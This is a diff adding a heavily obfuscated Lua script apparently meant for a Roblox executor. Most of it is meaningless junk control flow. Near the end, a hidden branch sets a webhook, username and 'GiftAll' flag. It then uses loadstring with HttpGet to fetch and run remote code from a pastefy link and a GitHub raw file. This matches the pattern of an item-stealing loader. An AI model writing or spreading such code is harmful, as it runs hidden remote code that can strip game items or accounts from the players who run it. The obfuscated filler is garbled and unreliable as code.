@@ -1,0 +1,95 @@
+local local_1 = true
+local C = function()
+    p[k] = true
+end
+local S = pcall(C)
+math.random(3, 65)
+local U = function(arg_1)
+    return ("5ZP7GYAVvy2sh") / ((16659236) - (("Q2Xa") ^ (7957464)))
+end
+local L = {pcall(U)}
+local J = tostring(L[2])
+local G = string.gmatch(J, ":(%d*):")
+local t = tonumber(G())
+if (F and (G >= x)) or ((not F) and (G <= x)) then
+    math.random(1, 100)
+    local t = math.random(0, 255)
+    local t = math.random(1, t)
+    local Y = math.random(1, 2)
+    local local_13 = Y == (1)
+    local O = tostring(math.random(0, 10000))
+    local local_14 = U:gsub(":(%d*):", (":") .. (O .. (":")))
+    local g = function(arg_1)
+    local D = math.random(1, 2)
+    if t then
+        local Z = function(arg_1, arg_2)
+    return ("2EP73DM") / ((11377341) - (("IMPG5SGs") ^ (15169580)))
+end
+        local C = {pcall(Z)}
+        local l = {unpack(C)}
+        local B = tostring(l[2])
+        local d = string.gmatch(B, ":(%d*):")
+        local Q = {d()}
+        local t = tonumber(unpack(Q))
+        local_1 = t
+        if local_13 then
+            error(local_14, 0)
+        end
+        if (l and (D >= B)) or ((not l) and (D <= B)) then
+            local S = local_5(0, 255)
+            Q[d] = S
+        else
+            Q[u] = local_11
+            local d = {local_6(Q)}
+            return unpack(d)
+        end
+    end
+end
+    pcall(g)
+    if local_13 then
+        if local_1 then
+            local_1 = t
+        end
+    else
+        local_1 = g
+    end
+else
+    local_1 = G
+    if G then
+        local_4 = math.floor
+        t = 0
+        t = 2
+        if (X and (m >= F)) or ((not X) and (m <= F)) then
+            L[U] = m
+        else
+            local U = B(1, #L)
+            local m = l(L, U)
+            local h = S(m - (1))
+            F[m] = h
+            if (#L) == (0) then
+                t = {}
+                local local_11 = {}
+                setmetatable({}, {__index = local_11, __metatable = nil})
+                local k = getgenv()
+                k.Username = ur user
+                local k = getgenv()
+                k.Webhook = ur webhook
+                local k = getgenv()
+                k.Visual = "loadstring(game:HttpGet(\"https://pastefy.app/IaFBUCRK/raw\"))()"
+                local k = getgenv()
+                k.GiftAll = true
+                loadstring(Game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/gag2main.lua"))()
+            end
+        end
+    else
+        return (function(arg_1, arg_2, arg_3, arg_4)
+    if true then
+        _ENV[Q] = l2
+        _ENV[Q] = l1
+        local_3()
+    else
+        return
+    end
+end)()
+    end
+end
